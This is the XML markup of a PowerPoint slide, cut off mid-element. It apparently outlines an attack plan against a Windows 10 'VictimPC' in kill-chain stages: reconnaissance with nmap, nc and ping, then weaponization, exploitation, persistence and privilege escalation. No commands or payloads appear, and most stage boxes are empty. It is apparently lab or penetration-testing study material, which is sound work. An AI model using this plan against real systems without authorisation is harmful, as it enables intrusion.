            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="8990237" y="5765648"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="8990237" y="5765648"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="12" name="四角形: 角を丸くする 11">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F14B437A-2B0B-44AD-AF71-F1AF5E41D9F2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8990237" y="5765648"/>
                <a:ext cx="1126671" cy="759279"/>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二等辺三角形 12">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{97994570-5827-40E1-8E3D-1C809DD45B31}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9221561" y="6524927"/>
                <a:ext cx="664027" cy="285750"/>
              </a:xfrm>
              <a:prstGeom prst="triangle">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 name="正方形/長方形 13">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD9F8244-71D9-4198-9904-14600F67E93E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9108620" y="5872388"/>
                <a:ext cx="889907" cy="54579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ボックス 15">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA7A626E-6384-42E6-9251-808D681D8E8D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9192306" y="5976862"/>
              <a:ext cx="1967592" cy="261610"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1050" dirty="0" err="1"/>
                <a:t>VictimPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1050" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="矢印: 上向き折線 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24E84BF4-CB74-48E5-A81A-56A712BF96C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3665917" y="-530763"/>
            <a:ext cx="4431375" cy="10454528"/>
          </a:xfrm>
          <a:prstGeom prst="bentUpArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 11281"/>
              <a:gd name="adj2" fmla="val 10814"/>
              <a:gd name="adj3" fmla="val 35780"/>
            </a:avLst>
          </a:prstGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="lt1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:lnRef>
          <a:fillRef idx="1">
            <a:schemeClr val="accent1">
              <a:tint val="50000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent1">
              <a:tint val="50000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="lt1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fontRef>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="テキスト ボックス 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B2DB12C-4E99-452F-9BFE-063F94103C7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1354832" y="447479"/>
            <a:ext cx="9691685" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400"/>
              <a:t>Approach3:</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="グループ化 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10752D72-3091-4B56-9267-55205B06D228}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1623624" y="1533875"/>
            <a:ext cx="4686162" cy="761995"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="761995"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="24" name="四角形: 角を丸くする 23">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{294B98B6-E090-4843-8525-656F7ED7D48B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491468" y="1520261"/>
              <a:ext cx="7780899"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0" name="四角形: 角を丸くする 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B24F1EF-D430-42F2-B552-049B28001865}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2607801" y="1654106"/>
              <a:ext cx="1967592" cy="356263"/>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100" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Reconnaissance</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="2" name="テキスト ボックス 1">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DB347B2-3F3C-40C7-9914-B443049E01A5}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4619958" y="1543592"/>
              <a:ext cx="5412921" cy="738664"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Portscan,IPscan</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Website(URL, </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Layout,mail</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> address)</a:t>
              </a:r>
              <a:br>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
              </a:br>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="グループ化 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E787FA3-C72F-4243-872B-1F8EB485D1E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1611564" y="3099560"/>
            <a:ext cx="4784299" cy="646541"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943847" cy="646541"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="四角形: 角を丸くする 25">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6104BA1F-5E5C-4D19-BDF5-8CB7A3A724F0}"/>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 name="グループ化 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3A17D01-9D8D-468C-A143-12D4A7C06864}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671764" y="2520750"/>
              <a:ext cx="7763550" cy="528375"/>
              <a:chOff x="2671764" y="2520750"/>
              <a:chExt cx="7763550" cy="528375"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="31" name="四角形: 角を丸くする 30">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BD7D45A-C104-4B41-81DC-5F78001649AE}"/>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rPr>
                  <a:t>Weaponization</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="27" name="テキスト ボックス 26">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{462A7246-78FD-462B-A575-9447FB11CF81}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4776110" y="2525905"/>
                <a:ext cx="5659204" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="グループ化 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{204AC1E6-E537-4172-A461-7ABD8230CC85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="1581447"/>
            <a:ext cx="4735755" cy="751726"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7863244" cy="751726"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="34" name="四角形: 角を丸くする 33">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ADC5810C-268B-4B77-AFB9-377D7E31E1FA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2472065" y="3278783"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="35" name="四角形: 角を丸くする 34">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0A027BF5-CF9E-4D80-9DB7-E6C22C87E656}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2627194" y="3383918"/>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Exploitation</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="29" name="テキスト ボックス 28">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A607270-D263-4193-850D-B9016329C0C3}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4749915" y="3291845"/>
              <a:ext cx="5585394" cy="738664"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>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sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="テキスト ボックス 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67DC3C26-A69A-4D87-B44D-E707C0D4E273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11241317" y="5988824"/>
            <a:ext cx="584968" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="テキスト ボックス 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55732190-C9A7-4CFC-BA51-6E6A5EF8E2EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1708819" y="2201617"/>
            <a:ext cx="7460125" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Portscan:nmap,nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>ipscan:ping,nmap,nc</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="テキスト ボックス 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C705EF42-E8D0-488E-B0D4-DAD87043883E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1468545" y="116910"/>
            <a:ext cx="6873267" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>TARGET</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Windows10</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="40" name="グループ化 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F5F1FA9-31DB-458E-B9E7-CDDE1613C0AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="4660745"/>
            <a:ext cx="5026053" cy="646332"/>
            <a:chOff x="2491462" y="4146186"/>
            <a:chExt cx="8345254" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="41" name="四角形: 角を丸くする 40">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{330374DF-55CB-4607-AB91-EF703A5F6BBA}"/>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42" name="グループ化 41">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5622D2E7-B74B-4299-802F-5B18CE535E4C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671758" y="4190002"/>
              <a:ext cx="8164958" cy="523220"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="523220"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="43" name="四角形: 角を丸くする 42">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F620D5B7-F779-425B-9769-B3388581BCA1}"/>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400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Privilege escalation</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="44" name="テキスト ボックス 43">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E453680-4964-452E-8D8E-32868BDFD542}"/>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r>
                  <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>P</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0" name="グループ化 49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA9BB01F-3B5A-4DCA-AE39-B3CF9EE2017C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="3123210"/>
            <a:ext cx="5026053" cy="646332"/>
            <a:chOff x="2491462" y="4146186"/>
            <a:chExt cx="8345254" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="51" name="四角形: 角を丸くする 50">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DEA3846-88FF-44C9-BAD8-874F89766A60}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491462" y="4146186"/>
              <a:ext cx="782547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2" name="グループ化 51">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE1F6F3B-51D6-4047-BC44-691D3727E5D9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671758" y="4190002"/>
              <a:ext cx="8164958" cy="523220"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="523220"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="53" name="四角形: 角を丸くする 52">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00D6F48F-4C89-4566-8982-808F2B2E0B62}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671758" y="425474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err="1">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Persistentence</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="54" name="テキスト ボックス 53">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24E0EDDF-D1E9-4B0F-9D37-E4674A7D6C2A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4731540" y="4190002"/>
                <a:ext cx="6105176" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
